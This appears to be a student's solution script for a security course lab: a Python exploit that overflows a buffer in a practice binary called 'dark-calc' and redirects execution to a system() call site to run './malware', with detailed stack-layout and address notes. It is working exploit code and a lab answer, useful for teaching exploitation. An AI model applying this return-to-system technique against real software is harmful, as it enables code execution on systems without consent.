#!/usr/bin/env python3
"""Lab 3 / Task 1 -- attack/dark-calc: ret2system via eval's call site.

The overflow of ``input()`` lets us overwrite the saved RBP and the return
address of ``input``.  ``input`` has just done ``strcpy(command_buf,
expression)``, so ``command_buf`` (0x6030d0) already contains the command we
want to run, namely ``./malware``.

Instead of returning to ``main`` (which would run ``eval`` and wrap our string
in ``echo $(( ... ))``), we jump straight to the ``system(command_buf)`` call
site inside ``eval``:

    0x401a6b:  mov  edi, 0x6030d0      ; rdi = command_buf
    0x401a70:  call 4017e0 <system@plt>

dark-calc runs ``main`` on a *fixed*, RWX stack mapped at 0x721000000000, with
a guard page starting at 0x721000801000.  That leaves exactly 0x30 bytes
between ``expression`` (0x721000800fd0) and the guard page, so the payload has
to stay below 48 bytes (gets() also stores its terminating NUL).  The layout
below uses 47 bytes and additionally makes the program leave through
``exit@plt`` instead of crashing:

  offset 0x00  "./malware\\0" + padding      -> strcpy()ed to command_buf
  offset 0x10  saved RBP = 0x721000800ff0    -> 2nd leave: rsp = 0x...ff0
  offset 0x18  return address = 0x401a6b     -> mov edi,command_buf; call system
  offset 0x20  0                             -> new RBP for the 2nd leave
  offset 0x28  0x401880 (low 7 bytes)        -> exit@plt; the NUL written by
                                                gets() is the 8th, zero byte
After ``system`` returns, execution falls through the rest of ``eval``
(0x401a75), whose ``leave`` uses our fake RBP = 0x...ff0 and returns into
``exit@plt``.
"""
import struct
import sys

# Fixed addresses (the binary is a non-PIE executable).
CALL_SYSTEM_SITE = 0x401A6B   # eval: mov edi, command_buf; call system@plt
COMMAND_BUF      = 0x6030D0   # global char command_buf[]
EXIT_PLT         = 0x401880   # exit@plt
STACK_TOP        = 0x721000801000   # first byte of the top guard page
SAVED_RBP        = STACK_TOP - 0x10  # 0x721000800ff0


def main() -> None:
    payload = b"./malware\x00"                  # copied into command_buf
    payload += b"A" * (0x10 - len(payload))     # fill expression[16]
    payload += struct.pack("<Q", SAVED_RBP)      # expression[0x10]: saved RBP
    payload += struct.pack("<Q", CALL_SYSTEM_SITE)  # expression[0x18]: ret addr
    payload += struct.pack("<Q", 0)              # expression[0x20]: fake RBP
    payload += struct.pack("<Q", EXIT_PLT)[:7]   # expression[0x28]: exit@plt

    assert len(payload) == 47, len(payload)
    assert b"\x0a" not in payload
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
